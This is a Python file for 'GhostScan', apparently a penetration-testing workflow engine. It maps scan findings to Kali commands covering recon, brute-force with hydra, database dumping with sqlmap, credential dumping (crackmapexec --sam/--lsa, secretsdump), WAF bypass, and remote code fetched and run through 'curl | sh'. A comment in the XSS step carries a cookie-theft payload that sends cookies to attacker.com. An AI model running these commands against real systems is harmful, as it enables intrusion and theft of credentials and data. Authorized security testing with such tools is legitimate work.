#!/usr/bin/env python3
"""
GhostScan - Adaptive Workflow Engine v2
Dynamic decision tree that adapts next steps based on actual findings.
"""

from modules.utils import log, Colors

WORKFLOW_STEPS = {
    "recon": {
        "phase": "1. Reconnaissance",
        "description": "Gather intelligence before touching the target.",
        "steps": [
            {
                "id": "R1", "title": "Passive DNS & WHOIS",
                "tools": ["whois", "dig", "dnsrecon"],
                "kali_commands": [
                    "whois {domain}",
                    "dig {domain} ANY +noall +answer",
                    "dnsrecon -d {domain} -t std",
                ],
                "what_to_look_for": [
                    "MX/TXT records (SPF/DMARC gaps, info leaks)",
                    "Internal nameservers (zone transfer target)",
                ],
                "notes": "Fully passive.",
            },
            {
                "id": "R2", "title": "Zone Transfer",
                "tools": ["dig", "dnsrecon"],
                "kali_commands": [
                    "dig axfr {domain} @{nameserver}",
                    "dnsrecon -d {domain} -t axfr",
                ],
                "what_to_look_for": ["All DNS records in one shot", "Internal hostnames"],
            },
            {
                "id": "R3", "title": "Subdomain Enumeration",
                "tools": ["sublist3r", "amass", "gobuster"],
                "kali_commands": [
                    "sublist3r -d {domain} -o subs.txt",
                    "amass enum -passive -d {domain}",
                    "gobuster dns -d {domain} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 50",
                ],
                "what_to_look_for": ["admin.*, dev.*, staging.* (less hardened)", "api.* (API surface)"],
            },
            {
                "id": "R4", "title": "OSINT Harvest",
                "tools": ["theHarvester"],
                "kali_commands": [
                    "theHarvester -d {domain} -b bing,certspotter,crtsh,hackertarget",
                    "# https://crt.sh/?q=%.{domain}",
                    "# https://shodan.io/search?query=hostname:{domain}",
                ],
                "what_to_look_for": ["Email formats", "Employee names", "IPs not in DNS"],
            },
        ],
    },
    "port_scan": {
        "phase": "2. Enumeration — Network",
        "description": "Map the full network attack surface.",
        "steps": [
            {
                "id": "P1", "title": "Full Port Discovery",
                "tools": ["masscan", "nmap"],
                "kali_commands": [
                    "masscan {target} -p0-65535 --rate=10000 -oG masscan.txt",
                    "nmap -sT -sV -sC -O -p{open_ports} --script=banner,http-title,ssl-cert -oA nmap_full {target}",
                    "nmap -sU --top-ports 200 {target}",
                ],
                "what_to_look_for": [
                    "Databases reachable externally (3306, 5432, 27017, 6379, 9200)",
                    "Management interfaces (3389, 5900, 5985)",
                ],
            },
            {
                "id": "P2", "title": "SMB Enumeration",
                "tools": ["enum4linux", "smbclient", "crackmapexec"],
                "kali_commands": [
                    "enum4linux-ng -A {target}",
                    "smbclient -L \\\\{target}\\ -N",
                    "crackmapexec smb {target} --shares --users --pass-pol",
                ],
                "what_to_look_for": ["Null session access", "World-readable shares", "Password policy"],
            },
            {
                "id": "P3", "title": "SNMP Enumeration",
                "tools": ["onesixtyone", "snmpwalk"],
                "kali_commands": [
                    "onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt {target}",
                    "snmpwalk -v2c -c public {target}",
                ],
                "what_to_look_for": ["Default community strings", "Running processes", "User accounts"],
            },
        ],
    },
    "web": {
        "phase": "2. Enumeration — Web",
        "description": "Map the full web application surface.",
        "steps": [
            {
                "id": "W1", "title": "Technology Fingerprinting",
                "tools": ["whatweb", "wafw00f", "curl"],
                "kali_commands": [
                    "whatweb -v -a 3 {url}",
                    "wafw00f {url}",
                    "curl -si {url} | grep -i 'server\\|x-powered-by\\|set-cookie'",
                ],
                "what_to_look_for": ["CMS", "WAF", "Framework versions → CVE lookup"],
            },
            {
                "id": "W2", "title": "Directory Brute-force",
                "tools": ["gobuster", "ffuf", "feroxbuster"],
                "kali_commands": [
                    "gobuster dir -u {url} -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,js,txt,json,bak,zip -t 50 -k",
                    "ffuf -u {url}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403 -t 100",
                ],
                "what_to_look_for": ["Admin panels", "Backup files (.bak, .zip, .old)", "Config files (.env, config.php)"],
            },
            {
                "id": "W3", "title": "Nikto Scan",
                "tools": ["nikto"],
                "kali_commands": [
                    "nikto -h {url} -C all -maxtime 300s -o nikto.txt",
                ],
                "what_to_look_for": ["Default files", "Dangerous HTTP methods", "Outdated versions"],
            },
            {
                "id": "W4", "title": "SSL/TLS Analysis",
                "tools": ["sslscan", "testssl"],
                "kali_commands": [
                    "sslscan {host}:{port}",
                    "testssl.sh {host}:{port}",
                ],
                "what_to_look_for": ["SSLv2/3, TLSv1.0/1.1", "Weak ciphers", "Heartbleed, POODLE"],
            },
            {
                "id": "W5", "title": "CMS Scan",
                "tools": ["wpscan", "joomscan"],
                "kali_commands": [
                    "wpscan --url {url} --enumerate vp,vt,u --plugins-detection aggressive",
                    "joomscan -u {url}",
                ],
                "what_to_look_for": ["Vulnerable plugins", "xmlrpc.php", "User enumeration"],
            },
            {
                "id": "W6", "title": "API & Parameter Fuzzing",
                "tools": ["ffuf", "wfuzz"],
                "kali_commands": [
                    "ffuf -u '{url}?FUZZ=value' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200,301 -t 50",
                    "ffuf -u {url}/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,201,401,403 -t 100",
                ],
                "what_to_look_for": ["Hidden parameters", "Internal API endpoints", "Vhost injection"],
            },
        ],
    },
    "vuln": {
        "phase": "3. Vulnerability Analysis",
        "description": "Probe identified surfaces for exploitable flaws.",
        "steps": [
            {
                "id": "V1", "title": "Security Header Audit",
                "tools": ["curl"],
                "kali_commands": [
                    "curl -si {url} | grep -iE 'strict-transport|content-security|x-frame|x-content-type'",
                ],
                "what_to_look_for": ["Missing HSTS", "Missing CSP", "Missing X-Frame-Options"],
            },
            {
                "id": "V2", "title": "SQL Injection (sqlmap)",
                "tools": ["sqlmap"],
                "kali_commands": [
                    "sqlmap -u '{url}?id=1' --level=3 --risk=2 --batch --dbs --random-agent",
                    "sqlmap -u '{url}' --forms --level=3 --risk=2 --batch",
                    "sqlmap -r request.txt --level=5 --risk=3 --batch --dbs",
                ],
                "what_to_look_for": ["Error-based", "Boolean-based", "Time-based blind"],
            },
            {
                "id": "V3", "title": "XSS Detection",
                "tools": ["xsstrike", "ffuf"],
                "kali_commands": [
                    "xsstrike -u '{url}?q=test' --crawl --fuzzer",
                    "ffuf -u '{url}?q=FUZZ' -w /usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt -mc 200 -t 50",
                ],
                "what_to_look_for": ["Reflected XSS", "DOM XSS sinks", "Blind XSS"],
            },
            {
                "id": "V4", "title": "Other Injection Vectors",
                "tools": ["commix", "ffuf"],
                "kali_commands": [
                    "commix --url='{url}?cmd=id' --level=3 --batch",
                    "ffuf -u '{url}?file=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -mc 200",
                    "ffuf -u '{url}?url=FUZZ' -w /usr/share/seclists/Fuzzing/SSRF.txt -mc 200",
                    "curl -sk '{url}?name={{7*7}}' | grep 49",
                ],
                "what_to_look_for": ["OS command injection", "LFI (/etc/passwd)", "SSRF (cloud metadata)", "SSTI (49 in response)"],
            },
            {
                "id": "V5", "title": "Nuclei Template Scan",
                "tools": ["nuclei"],
                "kali_commands": [
                    "nuclei -u {url} -severity critical,high,medium -o nuclei.txt",
                    "nuclei -u {url} -tags cve,exposure,misconfig",
                ],
                "what_to_look_for": ["CVE matches", "Exposed panels", "Default credentials"],
            },
        ],
    },
    "brute_force": {
        "phase": "3. Authentication Testing",
        "description": "Test authentication for weak/default credentials.",
        "steps": [
            {
                "id": "BF1", "title": "HTTP Login Brute-force",
                "tools": ["hydra"],
                "kali_commands": [
                    "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt {target} http-post-form '/login:user=^USER^&pass=^PASS^:Invalid' -t 16 -f",
                ],
                "what_to_look_for": ["No lockout", "Response length change on success"],
            },
            {
                "id": "BF2", "title": "Service Brute-force (SSH/FTP/SMB)",
                "tools": ["hydra", "medusa", "crackmapexec"],
                "kali_commands": [
                    "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://{target} -t 4 -f",
                    "crackmapexec smb {target} -u users.txt -p passwords.txt --continue-on-success",
                ],
            },
            {
                "id": "BF3", "title": "Offline Hash Cracking",
                "tools": ["john", "hashcat"],
                "kali_commands": [
                    "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64",
                    "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force",
                    "hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force",
                ],
            },
        ],
    },
    "post_enum": {
        "phase": "5. Post-Exploitation",
        "description": "After gaining access — enumerate impact scope.",
        "steps": [
            {
                "id": "PE1", "title": "Linux Privilege Escalation",
                "tools": ["linpeas"],
                "kali_commands": [
                    "curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
                    "sudo -l",
                    "find / -perm -4000 2>/dev/null",
                    "cat /etc/crontab",
                ],
            },
            {
                "id": "PE2", "title": "Windows Privilege Escalation",
                "tools": ["crackmapexec", "impacket"],
                "kali_commands": [
                    "crackmapexec smb {target} -u {user} -p {pass} --sam",
                    "crackmapexec smb {target} -u {user} -p {pass} --lsa",
                    "impacket-secretsdump DOMAIN/USER:PASS@{target}",
                ],
            },
        ],
    },
}


class WorkflowEngine:
    def __init__(self, config: dict):
        self.config  = config
        self.target  = config["target"]
        self.verbose = config.get("verbose", False)

    # ── ADAPTIVE DECISION ENGINE ─────────────────────────────────────────────

    def decide_next_steps(self, findings: dict) -> list:
        """Generate ordered actionable steps based on what was actually found."""
        steps = []

        open_ports = {}
        for hp in findings.get("open_ports", {}).values():
            open_ports.update({int(p): i for p, i in hp.items()})
        all_ports   = set(open_ports.keys())
        tech        = findings.get("technologies", {})
        cms_list    = tech.get("cms", [])
        endpoints   = set(findings.get("endpoints", []))
        dir_brute   = findings.get("dir_brute", [])
        sqli        = findings.get("sqli_findings", [])
        xss         = findings.get("xss_findings", [])
        secrets     = findings.get("js_secrets", [])
        waf         = findings.get("waf", {})
        waf_active  = waf.get("detected", False)
        waf_name    = waf.get("waf", "unknown")
        headers     = findings.get("header_audit", {}).get("missing", {})
        cves        = findings.get("cve_findings", [])
        subdomains  = findings.get("subdomains", [])
        base        = f"https://{self.target}"

        # Critical immediates
        if secrets:
            steps.append(self._step("SEC0", "IMMEDIATE: Rotate Exposed Secrets", "CRITICAL",
                "Secrets found in client-side JavaScript",
                ["# Rotate ALL exposed AWS/API/JWT keys immediately",
                 "# Test if keys grant production access before rotating"]))

        if sqli:
            steps.append(self._step("V2a", "Exploit SQLi — Extract Database", "CRITICAL",
                f"SQL injection confirmed ({len(sqli)} parameter(s))",
                [f"sqlmap -u '{base}?id=1' --level=5 --risk=3 --batch --dbs --dump",
                 "sqlmap -r request.txt --level=5 --risk=3 --batch --passwords"]))

        for cve in cves:
            if cve.get("severity") == "CRITICAL":
                steps.append(self._step("CVE1", f"Exploit: {cve.get('title','')}", "CRITICAL",
                    f"CVE match: {cve.get('cve','')} → {cve.get('matched','')}",
                    [f"searchsploit {cve.get('cve','')}",
                     f"nuclei -u {base} -tags {cve.get('cve','').lower()}"]))

        # Login panel → brute-force
        login_paths = [d.get("path","") for d in dir_brute
                       if any(k in d.get("path","").lower()
                              for k in ["login","admin","wp-login","signin","auth"])
                       and d.get("status") in (200, 302)]
        if login_paths:
            reason = f"Login panel at {login_paths[0]}"
            if "Content-Security-Policy" in headers:
                reason += " + no CSP"
            steps.append(self._step("BF1a", "Brute-force Login Panel", "HIGH", reason,
                [f"hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt "
                 f"-P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt "
                 f"{self.target} http-post-form '{login_paths[0]}:user=^USER^&pass=^PASS^:Invalid' -t 16 -f",
                 "# Check for: rate limiting, CAPTCHA, lockout threshold"]))

        # WordPress
        if any("wordpress" in c.lower() for c in cms_list):
            steps.append(self._step("W5a", "WordPress Deep Scan", "HIGH",
                "WordPress CMS detected",
                [f"wpscan --url {base} --enumerate vp,vt,u,cb,dbe --plugins-detection aggressive",
                 f"wpscan --url {base} --passwords /usr/share/wordlists/rockyou.txt --usernames admin"]))

        # SMB
        if 445 in all_ports or 139 in all_ports:
            steps.append(self._step("P2a", "SMB Full Enumeration", "HIGH",
                "SMB port open",
                [f"enum4linux-ng -A {self.target}",
                 f"crackmapexec smb {self.target} --shares --users --pass-pol",
                 f"crackmapexec smb {self.target} -u '' -p '' --shares"]))

        # Exposed databases
        db_open = all_ports & {3306, 5432, 1433, 27017, 6379, 9200}
        if db_open:
            cmds = []
            if 6379 in db_open:
                cmds.append(f"redis-cli -h {self.target} ping && redis-cli -h {self.target} info")
            if 9200 in db_open:
                cmds.append(f"curl -k https://{self.target}:9200/_cat/indices?v")
            if 27017 in db_open:
                cmds.append(f"mongosh {self.target} --eval 'db.adminCommand({{listDatabases:1}})'")
            if 3306 in db_open:
                cmds.append(f"hydra -L users.txt -P /usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt mysql://{self.target}")
            steps.append(self._step("P_DB", "Test Unauthenticated Database Access", "CRITICAL",
                f"Database ports reachable: {sorted(db_open)}", cmds))

        # XSS escalation
        if xss:
            steps.append(self._step("V3a", "Escalate XSS — Session Theft / Blind", "HIGH",
                f"XSS in {len(xss)} location(s)",
                [f"xsstrike -u '{base}?q=test' --crawl --fuzzer --blind",
                 "# Use XSS Hunter for blind: https://xsshunter.trufflesecurity.com",
                 "# Cookie theft payload: <script>fetch('https://attacker.com/?c='+document.cookie)</script>"]))

        # SSH
        if 22 in all_ports:
            steps.append(self._step("BF2a", "SSH Brute-force", "MEDIUM",
                "SSH port open",
                [f"nmap --script ssh-auth-methods -p22 {self.target}",
                 f"hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt "
                 f"-P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt "
                 f"ssh://{self.target} -t 4 -f"]))

        # API endpoints
        api_eps = [e for e in endpoints if any(k in e.lower() for k in ["/api/","/v1/","/v2/","/graphql"])]
        if api_eps:
            steps.append(self._step("W6a", "API Deep Enumeration", "HIGH",
                f"{len(api_eps)} API endpoints found",
                [f"ffuf -u {base}/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,201,401,403 -t 100",
                 f"curl -sk {base}/graphql -d '{{\"query\":\"{{__schema{{types{{name}}}}}}}}'",
                 "# Test IDOR: enumerate object IDs in API responses"]))

        # WAF bypass
        if waf_active:
            steps.append(self._step("WAF1", f"Apply WAF Bypass ({waf_name})", "MEDIUM",
                f"{waf_name} detected — standard tool signatures will be blocked",
                ["# sqlmap: --tamper=space2comment,randomcase,charencode",
                 "# gobuster: --delay 500ms --random-agent",
                 "# ffuf: -H 'X-Forwarded-For: 127.0.0.1' -rate 30",
                 "# Manual: try IP rotation, alternative encoding, case variation"]))

        # Large subdomain surface
        if len(subdomains) > 10:
            steps.append(self._step("R3a", "Enumerate All Subdomains", "MEDIUM",
                f"{len(subdomains)} subdomains — some likely unmonitored",
                [f"for sub in {' '.join(s.get('subdomain','') for s in subdomains[:5])}; do",
                 f"  gobuster dir -u https://$sub -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 30 -k;",
                 "done"]))

        return steps

    # ── LEGACY COMPAT ─────────────────────────────────────────────────────────

    def get_contextual_steps(self, findings: dict) -> list:
        open_ports = {}
        for hp in findings.get("open_ports", {}).values():
            open_ports.update({int(p): i for p, i in hp.items()})
        all_ports  = set(open_ports.keys())
        tech       = findings.get("technologies", {})
        subdomains = findings.get("subdomains", [])
        recommended = []
        if all_ports & {80, 443, 8080, 8443}:
            for step in ["W1","W2","W3","W4","V1","V2","V3","V5"]:
                phase = "web" if step.startswith("W") else "vuln"
                recommended.append((phase, step))
        if any("wordpress" in c.lower() for c in tech.get("cms",[])):
            recommended.append(("web","W5"))
        if 445 in all_ports: recommended.append(("port_scan","P2"))
        if 22  in all_ports: recommended.append(("brute_force","BF2"))
        if 161 in all_ports: recommended.append(("port_scan","P3"))
        if len(subdomains) > 5: recommended.append(("recon","R3"))
        return recommended

    def get_step(self, phase: str, step_id: str) -> dict:
        for s in WORKFLOW_STEPS.get(phase, {}).get("steps", []):
            if s["id"] == step_id:
                return s
        return {}

    def format_command(self, cmd: str, **kwargs) -> str:
        replacements = {
            "{target}": self.target, "{domain}": self.target,
            "{url}": f"https://{self.target}", "{host}": self.target,
            **kwargs,
        }
        for k, v in replacements.items():
            cmd = cmd.replace(k, str(v))
        return cmd

    def export_to_markdown(self, phases: list = None) -> str:
        lines = [f"# GhostScan Workflow — {self.target}\n"]
        for pk in (phases or list(WORKFLOW_STEPS.keys())):
            data = WORKFLOW_STEPS.get(pk, {})
            lines.append(f"## {data.get('phase', pk)}")
            lines.append(f"\n> {data.get('description','')}\n")
            for step in data.get("steps", []):
                lines.append(f"### [{step['id']}] {step['title']}")
                lines.append(f"\n**Tools:** {', '.join(step.get('tools',[]))}\n")
                if step.get("what_to_look_for"):
                    lines.append("**What to look for:**")
                    for item in step["what_to_look_for"]:
                        lines.append(f"- {item}")
                lines.append("\n```bash")
                for cmd in step.get("kali_commands", []):
                    lines.append(cmd)
                lines.append("```\n")
        return "\n".join(lines)

    def print_workflow(self, phase: str = None):
        phases = [phase] if phase else list(WORKFLOW_STEPS.keys())
        for pk in phases:
            data = WORKFLOW_STEPS.get(pk)
            if not data: continue
            log(f"\n{'═'*64}", Colors.BOLD_CYAN)
            log(f"  PHASE: {data['phase']}", Colors.BOLD_CYAN)
            log(f"{'═'*64}", Colors.BOLD_CYAN)
            log(f"  {data['description']}", Colors.DIM)
            for step in data["steps"]:
                log(f"\n  [{step['id']}] {step['title']}", Colors.BOLD_YELLOW)
                log(f"  Tools: {', '.join(step.get('tools',[]))}", Colors.CYAN)
                if step.get("what_to_look_for"):
                    log("  Look for:", Colors.GREEN)
                    for item in step["what_to_look_for"]:
                        log(f"    • {item}", Colors.DIM)
                log("  Commands:", Colors.GREEN)
                for cmd in step.get("kali_commands", []):
                    prefix = "  #" if cmd.startswith("#") else "  $"
                    color = Colors.DIM if cmd.startswith("#") else Colors.WHITE
                    log(f"{prefix} {cmd}", color)

    def print_adaptive_steps(self, findings: dict):
        steps = self.decide_next_steps(findings)
        if not steps:
            return
        log("\n  ┌─ Adaptive Next Steps ─────────────────────────────", Colors.BOLD_CYAN)
        log(f"  │  {len(steps)} actions based on scan findings", Colors.DIM)
        colors = {"CRITICAL": Colors.BOLD_RED, "HIGH": Colors.RED,
                  "MEDIUM": Colors.YELLOW, "LOW": Colors.DIM}
        for s in steps:
            sev = s.get("severity","MEDIUM")
            col = colors.get(sev, Colors.DIM)
            log(f"  │  {col}[{sev}]{Colors.RESET} [{s['id']}] {s['title']}", Colors.RESET)
            log(f"  │   {Colors.DIM}↳ {s['reason']}{Colors.RESET}", Colors.DIM)
            for cmd in s.get("commands", [])[:2]:
                prefix = "  #" if cmd.startswith("#") else "  $"
                color  = Colors.DIM if cmd.startswith("#") else Colors.WHITE
                log(f"  │    {prefix} {Colors.WHITE}{cmd[:85]}{Colors.RESET}", Colors.RESET)
        log("  └───────────────────────────────────────────────────", Colors.BOLD_CYAN)

    # ── HELPERS ───────────────────────────────────────────────────────────────

    def _step(self, sid: str, title: str, severity: str,
              reason: str, commands: list) -> dict:
        return {"id": sid, "title": title, "severity": severity,
                "reason": reason, "commands": commands}
